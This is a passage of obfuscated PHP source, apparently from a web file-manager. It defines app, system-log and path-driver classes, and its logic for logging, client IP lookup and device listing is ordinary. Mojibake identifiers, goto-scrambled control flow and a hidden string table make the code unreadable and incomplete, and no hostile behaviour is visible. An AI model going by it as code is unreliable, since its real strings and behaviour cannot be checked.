"\173\151\157\72{$d«²ÎŒêà¼}\175\57"; $b¾¶†ò¬Ğ = array($fĞ°¸…«¦¥[394] => 0, $fĞ°¸…«¦¥[1072] => array($fĞ°¸…«¦¥[379], "{$dğ ³ÜŞØÕ}\45")); goto dõÂ‡óŞ‡; aéŞµÛº: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x4c\151\147\150\164\101\160\x70"; public $modelType = "\123\x79\163\x74\145\155\x4f\x70\164\x69\157\156"; public $field = array("\156\x61\155\x65", "\147\162\157\165\160", "\144\x65\163\143", "\143\x6f\x6e\164\145\156\164"); public function listData($D„¼ŠíÑ‘Ì = false, $C«†©àŠŸÎ = "\x6d\157\144\x69\146\x79\x54\151\155\x65", $d®§’œÔŒ = true) { return parent::listData($D„¼ŠíÑ‘Ì, $C«†©àŠŸÎ, $d®§’œÔŒ); } public function remove($AÑ ­ËÔæ) { $B½ï™–‡¤ƒ = $this->findByName($AÑ ­ËÔæ); if (!$B½ï™–‡¤ƒ) { return !1; } return parent::remove($B½ï™–‡¤ƒ[$_SERVER[´¬][392]]); } public function add($C—ò‡ª¾—…) { if ($this->findByName($C—ò‡ª¾—…[$_SERVER[´¬][28]])) { return !1; } return parent::insert($C—ò‡ª¾—…); } public function update($bŸ®Ó‹†Á‰, $FËŸÄñ‡ˆ) { $EË±ÆÄñ© =& $_SERVER[´¬]; $fÄÜÚâ×° = $this->findByName($bŸ®Ó‹†Á‰); $EÛ±ÉĞô®À = $this->findByName($FËŸÄñ‡ˆ[$EË±ÆÄñ©[28]]); if (!$fÄÜÚâ×° || $EÛ±ÉĞô®À && $EÛ±ÉĞô®À[$EË±ÆÄñ©[392]] != $fÄÜÚâ×°[$EË±ÆÄñ©[392]]) { return !1; } return parent::update($fÄÜÚâ×°[$EË±ÆÄñ©[392]], $FËŸÄñ‡ˆ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\x69\156\163\x65\x72\x74", "\x66\x75\156\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $E…†ÙŒ»íÍ =& $_SERVER[´¬]; return array($E…†ÙŒ»íÍ[2001] => LNG($E…†ÙŒ»íÍ[2002]), $E…†ÙŒ»íÍ[2003] => LNG($E…†ÙŒ»íÍ[2004]), $E…†ÙŒ»íÍ[1629] => LNG($E…†ÙŒ»íÍ[2005]), $E…†ÙŒ»íÍ[2006] => LNG($E…†ÙŒ»íÍ[2007]), $E…†ÙŒ»íÍ[2008] => LNG($E…†ÙŒ»íÍ[2009]), $E…†ÙŒ»íÍ[2010] => LNG($E…†ÙŒ»íÍ[2011]), $E…†ÙŒ»íÍ[2012] => LNG($E…†ÙŒ»íÍ[2013]), $E…†ÙŒ»íÍ[1659] => LNG($E…†ÙŒ»íÍ[2013]), $E…†ÙŒ»íÍ[1660] => LNG($E…†ÙŒ»íÍ[2014]), $E…†ÙŒ»íÍ[2015] => LNG($E…†ÙŒ»íÍ[2016]), $E…†ÙŒ»íÍ[2017] => LNG($E…†ÙŒ»íÍ[2018]), $E…†ÙŒ»íÍ[2019] => LNG($E…†ÙŒ»íÍ[2020]), $E…†ÙŒ»íÍ[2021] => LNG($E…†ÙŒ»íÍ[2022]), $E…†ÙŒ»íÍ[1657] => LNG($E…†ÙŒ»íÍ[2023]), $E…†ÙŒ»íÍ[1664] => LNG($E…†ÙŒ»íÍ[2024]), $E…†ÙŒ»íÍ[2025] => LNG($E…†ÙŒ»íÍ[2026]), $E…†ÙŒ»íÍ[2027] => LNG($E…†ÙŒ»íÍ[2028]), $E…†ÙŒ»íÍ[2029] => LNG($E…†ÙŒ»íÍ[2030]), $E…†ÙŒ»íÍ[2031] => LNG($E…†ÙŒ»íÍ[2032]), $E…†ÙŒ»íÍ[1667] => LNG($E…†ÙŒ»íÍ[2033]), $E…†ÙŒ»íÍ[1668] => LNG($E…†ÙŒ»íÍ[2034]), $E…†ÙŒ»íÍ[2035] => LNG($E…†ÙŒ»íÍ[2036]), $E…†ÙŒ»íÍ[2037] => LNG($E…†ÙŒ»íÍ[2038]), $E…†ÙŒ»íÍ[2039] => LNG($E…†ÙŒ»íÍ[2040]), $E…†ÙŒ»íÍ[1662] => LNG($E…†ÙŒ»íÍ[2041]), $E…†ÙŒ»íÍ[2042] => LNG($E…†ÙŒ»íÍ[2043]), $E…†ÙŒ»íÍ[1661] => LNG($E…†ÙŒ»íÍ[2044]), $E…†ÙŒ»íÍ[2045] => LNG($E…†ÙŒ»íÍ[2046]), $E…†ÙŒ»íÍ[2047] => LNG($E…†ÙŒ»íÍ[2048]), $E…†ÙŒ»íÍ[2049] => LNG($E…†ÙŒ»íÍ[2050]), $E…†ÙŒ»íÍ[2051] => LNG($E…†ÙŒ»íÍ[2051]), $E…†ÙŒ»íÍ[2052] => LNG($E…†ÙŒ»íÍ[1633]), $E…†ÙŒ»íÍ[2053] => LNG($E…†ÙŒ»íÍ[2054]), $E…†ÙŒ»íÍ[2055] => LNG($E…†ÙŒ»íÍ[2056]), $E…†ÙŒ»íÍ[2057] => LNG($E…†ÙŒ»íÍ[2058]), $E…†ÙŒ»íÍ[2059] => LNG($E…†ÙŒ»íÍ[2060]), $E…†ÙŒ»íÍ[2061] => LNG($E…†ÙŒ»íÍ[2062]), $E…†ÙŒ»íÍ[2063] => LNG($E…†ÙŒ»íÍ[2063]), $E…†ÙŒ»íÍ[2064] => LNG($E…†ÙŒ»íÍ[2065]), $E…†ÙŒ»íÍ[2066] => LNG($E…†ÙŒ»íÍ[2067]), $E…†ÙŒ»íÍ[2068] => LNG($E…†ÙŒ»íÍ[2069]), $E…†ÙŒ»íÍ[2070] => LNG($E…†ÙŒ»íÍ[2071]), $E…†ÙŒ»íÍ[2072] => LNG($E…†ÙŒ»íÍ[2073]), $E…†ÙŒ»íÍ[2074] => LNG($E…†ÙŒ»íÍ[2075])); } private function typeFile() { $e˜àÆøŸšÑ =& $_SERVER[´¬]; $EË“ÏìËÍ° = array($e˜àÆøŸšÑ[1664] => array($e˜àÆøŸšÑ[1665]), $e˜àÆøŸšÑ[2019] => array($e˜àÆøŸšÑ[2076]), $e˜àÆøŸšÑ[2021] => array($e˜àÆøŸšÑ[2077]), $e˜àÆøŸšÑ[1657] => array($e˜àÆøŸšÑ[1658]), $e˜àÆøŸšÑ[2027] => array(), $e˜àÆøŸšÑ[2029] => array(), $e˜àÆøŸšÑ[2031] => array(), $e˜àÆøŸšÑ[1667] => array($e˜àÆøŸšÑ[1669]), $e˜àÆøŸšÑ[1668] => array($e˜àÆøŸšÑ[1669]), $e˜àÆøŸšÑ[2035] => array($e˜àÆøŸšÑ[2078]), $e˜àÆøŸšÑ[2037] => array($e˜àÆøŸšÑ[2078]), $e˜àÆøŸšÑ[2039] => array($e˜àÆøŸšÑ[2079]), $e˜àÆøŸšÑ[2025] => array($e˜àÆøŸšÑ[2080]), $e˜àÆøŸšÑ[1662] => array($e˜àÆøŸšÑ[2081]), $e˜àÆøŸšÑ[2042] => array($e˜àÆøŸšÑ[2082]), $e˜àÆøŸšÑ[1661] => array($e˜àÆøŸšÑ[1663])); return $EË“ÏìËÍ°; } private function typeAll() { goto eÄ´ÊÑèß; eÄ´ÊÑèß: $d˜®ŞÁªİ£ =& $_SERVER[´¬]; $DñŸõ«‹®ß = $this->typeList; $cà°¸®ßÈ = array_filter($this->typeFile()); goto d¸¦Å©“ÒÏ; d¸¦Å©“ÒÏ: foreach ($cà°¸®ßÈ as $fïÎ¢á´Š => $cô¼ÛÕ¿ÄÇ) { $DñŸõ«‹®ß[$cô¼ÛÕ¿ÄÇ[0]] = $DñŸõ«‹®ß[$fïÎ¢á´Š]; } $DñŸõ«‹®ß[$d˜®ŞÁªİ£[1669]] = LNG($d˜®ŞÁªİ£[2083]); $DñŸõ«‹®ß[$d˜®ŞÁªİ£[2078]] = LNG($d˜®ŞÁªİ£[2084]); goto D†Üäù‚×; D†Üäù‚×: return $DñŸõ«‹®ß; goto d›Œñêæ ; d›Œñêæ : } public function addLog($AÉªƒ»¢¥ , $B°¥²œ‰µÕ = array()) { goto bš‡‹¿ÌÌ; aŒ”â¾è³¨: if (!$eõ£“Óé÷–) { $eõ£“Óé÷– = (int) Session::get($F‡ÛøâÏ“÷[1815]); } $B¾¨ßî®çŠ = get_client_ip(); if (!$B°¥²œ‰µÕ || strlen(json_encode($B°¥²œ‰µÕ)) >= 1024) { $B°¥²œ‰µÕ = array($F‡ÛøâÏ“÷[2085] => $B¾¨ßî®çŠ); } else { if (is_array($B°¥²œ‰µÕ)) { $B°¥²œ‰µÕ[$F‡ÛøâÏ“÷[2085]] = $B¾¨ßî®çŠ; } else { $B°¥²œ‰µÕ = array($F‡ÛøâÏ“÷[1089] => $B°¥²œ‰µÕ, $F‡ÛøâÏ“÷[2085] => $B¾¨ßî®çŠ); } } goto D½‡ÁÚÀì¥; D½‡ÁÚÀì¥: $B°¥²œ‰µÕ = array($F‡ÛøâÏ“÷[1517] => Session::sign(), $F‡ÛøâÏ“÷[1518] => $eõ£“Óé÷–, $F‡ÛøâÏ“÷[29] => $AÉªƒ»¢¥ , $F‡ÛøâÏ“÷[1520] => json_encode($B°¥²œ‰µÕ)); parent::add($B°¥²œ‰µÕ); goto f˜¶˜Îˆİ; bš‡‹¿ÌÌ: $F‡ÛøâÏ“÷ =& $_SERVER[´¬]; if (!isset($this->typeList[$AÉªƒ»¢¥ ])) { return; } $eõ£“Óé÷– = defined($F‡ÛøâÏ“÷[452]) && USER_ID ? USER_ID : (isset($B°¥²œ‰µÕ[$F‡ÛøâÏ“÷[1526]]) ? $B°¥²œ‰µÕ[$F‡ÛøâÏ“÷[1526]] : 0); goto aŒ”â¾è³¨; f˜¶˜Îˆİ: } public function remove($FôÇ·ƒÅÂ) { $this->where(array($_SERVER[´¬][410] => $FôÇ·ƒÅÂ))->delete(); } private function _makeOrder($aÆÙ÷š±¢” = '') { goto FÊ…×†íœ÷; b×„åîÀ‚ï: return $this->order($aÆÙ÷š±¢”); goto fâÉó…§‘; FÊ…×†íœ÷: $A‚¥Áó‰ò =& $_SERVER[´¬]; $bÅİÕ˜ï = $A‚¥Áó‰ò[193]; $cõëÍ¼­ö = array($A‚¥Áó‰ò[426] => $A‚¥Áó‰ò[427], $A‚¥Áó‰ò[428] => $A‚¥Áó‰ò[429]); goto B¨š²é¬—ô; B¨š²é¬—ô: $Bˆ½¥ĞÏ²› = Input::get($A‚¥Áó‰ò[434], $A‚¥Áó‰ò[7], $A‚¥Áó‰ò[1847], array($A‚¥Áó‰ò[1771], $A‚¥Áó‰ò[428])); $Bˆ½¥ĞÏ²› = $cõëÍ¼­ö[$Bˆ½¥ĞÏ²›]; $aÆÙ÷š±¢” = $aÆÙ÷š±¢” . "{$bÅİÕ˜ï}\x20{$Bˆ½¥ĞÏ²›}"; goto b×„åîÀ‚ï; fâÉó…§‘: } public function get($cØ‘§öäÄ… = '') { goto B‘Û´èóè; CõÎœ¨İ£: if ($cØ‘§öäÄ…[$EÄ•ã•Œ[1526]]) { $eß„ğ’É¿…[$EÄ•ã•Œ[1526]] = $cØ‘§öäÄ…[$EÄ•ã•Œ[1526]]; } if (isset($cØ‘§öäÄ…[$EÄ•ã•Œ[721]])) { $AÉÇÏˆÍÃ = $cØ‘§öäÄ…[$EÄ•ã•Œ[721]]; $CÁ¼â§Ø“¶ = isset($cØ‘§öäÄ…[$EÄ•ã•Œ[474]]) ? $cØ‘§öäÄ…[$EÄ•ã•Œ[474]] : time(); $eß„ğ’É¿…[$EÄ•ã•Œ[193]] = array($EÄ•ã•Œ[330], array($AÉÇÏˆÍÃ, $CÁ¼â§Ø“¶)); } if ($cØ‘§öäÄ…[$EÄ•ã•Œ[29]]) { $B÷ä™ÜêÁŒ = explode($EÄ•ã•Œ[47], $cØ‘§öäÄ…[$EÄ•ã•Œ[29]]); $e Ø–¬„‹  = $this->typeFile(); $dİâ¼Œß™ = array(); foreach ($B÷ä™ÜêÁŒ as $Aêñòõ©«†) { $dİâ¼Œß™[] = $Aêñòõ©«†; if (isset($e Ø–¬„‹ [$Aêñòõ©«†])) { $dİâ¼Œß™ = array_merge($dİâ¼Œß™, $e Ø–¬„‹ [$Aêñòõ©«†]); } } $dİâ¼Œß™ = array_unique($dİâ¼Œß™); if ($dİâ¼Œß™) { $eß„ğ’É¿…[$EÄ•ã•Œ[29]] = array($EÄ•ã•Œ[7], $dİâ¼Œß™); } } else { $eß„ğ’É¿…[$EÄ•ã•Œ[29]] = array($EÄ•ã•Œ[2086], $EÄ•ã•Œ[2087]); } goto a¾ÎÈŸ™; B‘Û´èóè: $EÄ•ã•Œ =& $_SERVER[´¬]; if (!$cØ‘§öäÄ…) { show_json(array()); } $eß„ğ’É¿… = array(); goto CõÎœ¨İ£; DÚ¹ëĞ«–©: $b‹Û·é†ÉĞ[$EÄ•ã•Œ[366]] = $this->logList($b‹Û·é†ÉĞ[$EÄ•ã•Œ[366]]); return $b‹Û·é†ÉĞ; goto b§¶–™Şåº; a¾ÎÈŸ™: if (!empty($cØ‘§öäÄ…[$EÄ•ã•Œ[2085]])) { $eß„ğ’É¿…[$EÄ•ã•Œ[429]] = array($EÄ•ã•Œ[379], "\45{$cØ‘§öäÄ…[$EÄ•ã•Œ[2085]]}\45"); } $b‹Û·é†ÉĞ = $this->_makeOrder()->where($eß„ğ’É¿…)->selectPage(); if (empty($b‹Û·é†ÉĞ[$EÄ•ã•Œ[366]])) { show_json(array(), !0, $b‹Û·é†ÉĞ[$EÄ•ã•Œ[363]]); } goto DÚ¹ëĞ«–©; b§¶–™Şåº: } private function ipAddress(&$a¨Èœ¼‰„°) { $b¬¿õ¢‚“ä =& $_SERVER[´¬]; if (!empty($a¨Èœ¼‰„°[$b¬¿õ¢‚“ä[2085]])) { $eÉºòÕ”Ï = IpLocation::get($a¨Èœ¼‰„°[$b¬¿õ¢‚“ä[2085]]); } else { $eÉºòÕ”Ï = LNG($b¬¿õ¢‚“ä[2088]); } $a¨Èœ¼‰„°[$b¬¿õ¢‚“ä[2089]] = $eÉºòÕ”Ï; } private function descZipDownload($cÜìôñù¿¿, &$dÁ¥É‹–¥…) { $cšÊñ“æÅ =& $_SERVER[´¬]; if (!isset($cÜìôñù¿¿[$cšÊñ“æÅ[2090]])) { return; } $a¬ğ‚ŒßÌØ = json_decode($cÜìôñù¿¿[$cšÊñ“æÅ[2090]], !0); foreach ($a¬ğ‚ŒßÌØ as $bÏ• ˆÄ×á) { try { $Dšî‰¬·¶ = IO::infoFull($bÏ• ˆÄ×á[$cšÊñ“æÅ[76]]); } catch (Exception $a‚¤…ö´¥) { continue; } $cÜìôñù¿¿[$cšÊñ“æÅ[76]] = $bÏ• ˆÄ×á[$cšÊñ“æÅ[76]]; $dÁ¥É‹–¥…[] = $cÜìôñù¿¿[$cšÊñ“æÅ[394]] = $Dšî‰¬·¶[$cšÊñ“æÅ[394]]; $dÁ¥É‹–¥…[] = $cÜìôñù¿¿[$cšÊñ“æÅ[1903]] = $Dšî‰¬·¶[$cšÊñ“æÅ[476]]; break; } return $cÜìôñù¿¿; } private function getSourceList(&$BË°˜¿µÏ±) { $c„…è¿ƒ™Ë =& $_SERVER[´¬]; $Aê·Ë¾‡²Ÿ = array(); foreach ($BË°˜¿µÏ± as $d—ÙÖ’ÖÖ => $dåí„öºÙê) { goto b¨ö´œåµ®; AÕÑ‘î›¾: if ($DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[29]] == $c„…è¿ƒ™Ë[1911]) { $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[429]][$c„…è¿ƒ™Ë[394]]; } goto A±ĞàãŸ¤; b¨ö´œåµ®: $DÖÀƒÖ–Ôè = json_decode($dåí„öºÙê[$c„…è¿ƒ™Ë[429]], !0); if ($dåí„öºÙê[$c„…è¿ƒ™Ë[29]] == $c„…è¿ƒ™Ë[1660]) { $DÖÀƒÖ–Ôè = $this->descZipDownload($DÖÀƒÖ–Ôè, $Aê·Ë¾‡²Ÿ); $BË°˜¿µÏ±[$d—ÙÖ’ÖÖ][$c„…è¿ƒ™Ë[429]] = json_encode($DÖÀƒÖ–Ôè); continue; } if (strpos($dåí„öºÙê[$c„…è¿ƒ™Ë[29]], $c„…è¿ƒ™Ë[1904]) !== 0) { if (!isset($DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[76]]) || strpos($dåí„öºÙê[$c„…è¿ƒ™Ë[29]], $c„…è¿ƒ™Ë[2091]) !== 0) { continue; } try { $dĞóèŸì‘ = IO::infoFull($DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[76]]); } catch (Exception $bÇ„‘©èà) { continue; } $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[394]] = $dĞóèŸì‘[$c„…è¿ƒ™Ë[394]]; $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[1903]] = $dĞóèŸì‘[$c„…è¿ƒ™Ë[476]]; $BË°˜¿µÏ±[$d—ÙÖ’ÖÖ][$c„…è¿ƒ™Ë[429]] = json_encode($DÖÀƒÖ–Ôè); continue; } goto dÅõœÄÑÍ; dÅõœÄÑÍ: $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[394]]; $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[1903]]; if ($DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[29]] == $c„…è¿ƒ™Ë[519]) { $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[429]][$c„…è¿ƒ™Ë[1056]]; $Aê·Ë¾‡²Ÿ[] = $DÖÀƒÖ–Ôè[$c„…è¿ƒ™Ë[429]][$c„…è¿ƒ™Ë[1057]]; } goto AÕÑ‘î›¾; A±ĞàãŸ¤: } if (!$Aê·Ë¾‡²Ÿ) { return array(); } return Model($c„…è¿ƒ™Ë[790])->sourceListInfo($Aê·Ë¾‡²Ÿ, !0); } private function logList($c‚àâ£Ê‡) { goto B£ßæ´´İß; BïÅÆŒº: $AÎ³›Œß´¢ = $this->getSourceList($c‚àâ£Ê‡); $fÛ©Şí“Û = $this->typeAll(); $c¸Ÿ‹¬¿Õª = array(); goto a§™‘„ ¨¼; F¢–ÌâÆñò: return $c¸Ÿ‹¬¿Õª; goto Bç”„Ñë¨›; a§™‘„ ¨¼: $a­à´­À›á = array(); foreach ($c‚àâ£Ê‡ as $a“ïÂ‹ÆØ => $dôÌğªƒ‰¥) { goto dŸµ¦óÊÌ; dŸµ¦óÊÌ: $bÎ…Óğæê = $dôÌğªƒ‰¥[$B«Çš—¿¢â[29]]; $aæğ‚È‘– = isset($EÒøëÖËå¤[$dôÌğªƒ‰¥[$B«Çš—¿¢â[1526]]]) ? $EÒøëÖËå¤[$dôÌğªƒ‰¥[$B«Çš—¿¢â[1526]]] : !1; $d½ö”ŒÃõ = strpos($bÎ…Óğæê, $B«Çš—¿¢â[2092]) === 0 ? LNG($B«Çš—¿¢â[2093]) : LNG($B«Çš—¿¢â[2088]); goto E˜±Ğî‹Ş‰; E˜±Ğî‹Ş‰: $dôÌğªƒ‰¥[$B«Çš—¿¢â[28]] = isset($aæğ‚È‘–[$B«Çš—¿¢â[28]]) ? $aæğ‚È‘–[$B«Çš—¿¢â[28]] : LNG($B«Çš—¿¢â[2088]); $dôÌğªƒ‰¥[$B«Çš—¿¢â[1953]] = isset($aæğ‚È‘–[$B«Çš—¿¢â[1953]]) ? $aæğ‚È‘–[$B«Çš—¿¢â[1953]] : $B«Çš—¿¢â[33]; $dôÌğªƒ‰¥[$B«Çš—¿¢â[1432]] = isset($fÛ©Şí“Û[$bÎ…Óğæê]) ? $fÛ©Şí“Û[$bÎ…Óğæê] : $d½ö”ŒÃõ; goto aİôà‡İè¿; aİôà‡İè¿: $dôÌğªƒ‰¥[$B«Çš—¿¢â[1846]] = $aæğ‚È‘–; $C¢ĞŒèÔ…Í = json_decode($dôÌğªƒ‰¥[$B«Çš—¿¢â[429]], !0); $dôÌğªƒ‰¥[$B«Çš—¿¢â[2085]] = isset($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[2085]]) ? $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[2085]] : $B«Çš—¿¢â[33]; goto B›ãœä£•; B›ãœä£•: $this->ipAddress($dôÌğªƒ‰¥); if (strpos($bÎ…Óğæê, $B«Çš—¿¢â[1904]) === 0 || isset($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1903]])) { goto Aâ«Å¬ĞÓ©; Aâ«Å¬ĞÓ©: $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[85]] = $AÎ³›Œß´¢[$C¢ĞŒèÔ…Í[$B«Çš—¿¢â[394]]]; $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1916]] = $AÎ³›Œß´¢[$C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1903]]]; if ($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[29]] == $B«Çš—¿¢â[519]) { $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[1056]] = $AÎ³›Œß´¢[$C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[1056]]]; $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[1057]] = $AÎ³›Œß´¢[$C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[1057]]]; } goto D˜¤‹½Å¦í; D˜¤‹½Å¦í: if ($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[29]] == $B«Çš—¿¢â[1911]) { $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[394]] = $AÎ³›Œß´¢[$C¢ĞŒèÔ…Í[$B«Çš—¿¢â[429]][$B«Çš—¿¢â[394]]]; } if ($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[29]] == $B«Çš—¿¢â[1655]) { $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1916]] = $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[85]]; $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1903]] = $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1916]][$B«Çš—¿¢â[394]]; $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[85]] = !1; $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[394]] = $B«Çš—¿¢â[33]; } if ($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[85]] && $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[85]][$B«Çš—¿¢â[402]] == $B«Çš—¿¢â[1171]) { $a­à´­À›á[] = $dôÌğªƒ‰¥[$B«Çš—¿¢â[392]]; unset($c‚àâ£Ê‡[$a“ïÂ‹ÆØ]); continue; } goto F©Åõ‘ÍŠ ; F©Åõ‘ÍŠ : if ($C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1916]] && $C¢ĞŒèÔ…Í[$B«Çš—¿¢â[1916]][$B«Çš—¿¢â[402]] == $B«Çš—¿¢â[1171]) { $a­à´­À›á[] = $dôÌğªƒ‰¥[$B«Çš—¿¢â[392]]; unset($c‚àâ£Ê‡[$a“ïÂ‹ÆØ]); continue; } goto f‘â£É¡¸; f‘â£É¡¸: } $dôÌğªƒ‰¥[$B«Çš—¿¢â[429]] = $C¢ĞŒèÔ…Í; goto Eğ–ï›«Ã; Eğ–ï›«Ã: unset($dôÌğªƒ‰¥[$B«Çš—¿¢â[2094]]); $c¸Ÿ‹¬¿Õª[] = $dôÌğªƒ‰¥; goto f ²¿ø£¬è; f ²¿ø£¬è: } $this->clearSystemPathLog($a­à´­À›á); goto F¢–ÌâÆñò; B£ßæ´´İß: $B«Çš—¿¢â =& $_SERVER[´¬]; $AœÛçóÇÌ† = array_to_keyvalue($c‚àâ£Ê‡, $B«Çš—¿¢â[33], $B«Çš—¿¢â[1526]); $EÒøëÖËå¤ = Model($B«Çš—¿¢â[505])->userListInfo(array_unique($AœÛçóÇÌ†)); goto BïÅÆŒº; Bç”„Ñë¨›: } private function clearSystemPathLog($E£ˆä¤–Ï) { $FÆŸáÏíßÄ =& $_SERVER[´¬]; if (count($E£ˆä¤–Ï) == 0) { return; } $EÉÁ‡°ôù¿ = array($FÆŸáÏíßÄ[392] => array($FÆŸáÏíßÄ[7], array_unique($E£ˆä¤–Ï))); $this->where($EÉÁ‡°ôù¿)->delete(); } public function deviceList($Eš¬«±Èö, $c‡‡ÉÜº» = 0) { $b¸ï÷¦ŞÉ  =& $_SERVER[´¬]; $D’„¡†ÛÖ = array($b¸ï÷¦ŞÉ [1526] => $Eš¬«±Èö, $b¸ï÷¦ŞÉ [193] => array($b¸ï÷¦ŞÉ [972], $c‡‡ÉÜº»), $b¸ï÷¦ŞÉ [29] => $b¸ï÷¦ŞÉ [1629]); $B¬é…Ô¦¿ = array(); $EÉÚÁİãê = $this->field($b¸ï÷¦ŞÉ [2095])->where($D’„¡†ÛÖ)->order($b¸ï÷¦ŞÉ [1914])->limit(50)->select(); foreach ($EÉÚÁİãê as $EÍ‰”ñ©¸‡ => $fÔ¸†Ôå˜ê) { goto BÃŞÖïå“Ü; F×Ë‚™ƒ: $this->ipAddress($fÔ¸†Ôå˜ê); $fÔ¸†Ôå˜ê[$b¸ï÷¦ŞÉ [429]] = $a†¾öˆÅ‹“; $B¬é…Ô¦¿[$f—»â¡˜©ƒ] = $fÔ¸†Ôå˜ê; goto a·§öÓ´Óë; BÃŞÖïå“Ü: if ($EÍ‰”ñ©¸‡ > 0 && abs($fÔ¸†Ôå˜ê[$b¸ï÷¦ŞÉ [193]] - $EÉÚÁİãê[$EÍ‰”ñ©¸‡ - 1][$b¸ï÷¦ŞÉ [193]]) < 5) { continue; } $a†¾öˆÅ‹“ = json_decode($fÔ¸†Ôå˜ê[$b¸ï÷¦ŞÉ [429]], !0); $fÔ¸†Ôå˜ê[$b¸ï÷¦ŞÉ [2085]] = isset($a†¾öˆÅ‹“[$b¸ï÷¦ŞÉ [2085]]) ? $a†¾öˆÅ‹“[$b¸ï÷¦ŞÉ [2085]] : $b¸ï÷¦ŞÉ [33]; goto AÂÜÊ§£¿; AÂÜÊ§£¿: unset($a†¾öˆÅ‹“[$b¸ï÷¦ŞÉ [2085]]); $f—»â¡˜©ƒ = $this->deviceType($a†¾öˆÅ‹“[$b¸ï÷¦ŞÉ [1905]]); if (isset($B¬é…Ô¦¿[$f—»â¡˜©ƒ])) { continue; } goto F×Ë‚™ƒ; a·§öÓ´Óë: } return array_values($B¬é…Ô¦¿); } public function deviceType($DËÄğ÷Ä‚) { return $DËÄğ÷Ä‚; } } goto c¨ºØÕïá; b…§ù®²¿: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eï‚ÄÔÛ¼ =& $_SERVER[´¬]; $this->objectDriver = array($eï‚ÄÔÛ¼[57], $eï‚ÄÔÛ¼[58], $eï‚ÄÔÛ¼[59], $eï‚ÄÔÛ¼[60], $eï‚ÄÔÛ¼[61], $eï‚ÄÔÛ¼[62], $eï‚ÄÔÛ¼[63], $eï‚ÄÔÛ¼[64], $eï‚ÄÔÛ¼[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($B¢ğ×ÔÂ·) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($B¢ğ×ÔÂ·, $_SERVER[´¬][8]); } return $B¢ğ×ÔÂ·; } public function iconvApp($f—ÃÊ‡•İ¾) { return $f—ÃÊ‡•İ¾; } public function iconvSystem($f™Ø„©‚‘) { return $f™Ø„©‚‘; } public function iconvTo($B ¶ÒÀç‚á, $B†“„¤©Ú‰, $cî‰©÷µÌ¸) { goto fÚœØ˜‹¡; AÇ›“î®›ó: $C’ªÊĞùÈ[$cî‰©÷µÌ¸ . $f…ë¹ßŸ©Ó[67] . $B†“„¤©Ú‰ . $f…ë¹ßŸ©Ó[68] . $B ¶ÒÀç‚á] = $B ¶ÒÀç‚á; $C’ªÊĞùÈ[$cî‰©÷µÌ¸ . $f…ë¹ßŸ©Ó[67] . $B†“„¤©Ú‰ . $f…ë¹ßŸ©Ó[68] . $c÷æòÜ…Û] = $B ¶ÒÀç‚á; $C’ªÊĞùÈ[$B†“„¤©Ú‰ . $f…ë¹ßŸ©Ó[67] . $cî‰©÷µÌ¸ . $f…ë¹ßŸ©Ó[68] . $c÷æòÜ…Û] = $c÷æòÜ…Û; goto CîôÁèò¤Å; e‚›™‰¬„¦: $Bğ‰„ùÓ‚ = $B†“„¤©Ú‰ . $f…ë¹ßŸ©Ó[67] . $cî‰©÷µÌ¸ . $f…ë¹ßŸ©Ó[68] . $B ¶ÒÀç‚á; if (isset($C’ªÊĞùÈ[$Bğ‰„ùÓ‚])) { return $C’ªÊĞùÈ[$Bğ‰„ùÓ‚]; } if (function_exists($f…ë¹ßŸ©Ó[69])) { $c÷æòÜ…Û = @mb_convert_encoding($B ¶ÒÀç‚á, $cî‰©÷µÌ¸, $B†“„¤©Ú‰); } else { $c÷æòÜ…Û = @iconv($B†“„¤©Ú‰, $cî‰©÷µÌ¸, $B ¶ÒÀç‚á); } goto bÜÈ¯èé¦ó; fÚœØ˜‹¡: $f…ë¹ßŸ©Ó =& $_SERVER[´¬]; if (!$B ¶ÒÀç‚á || 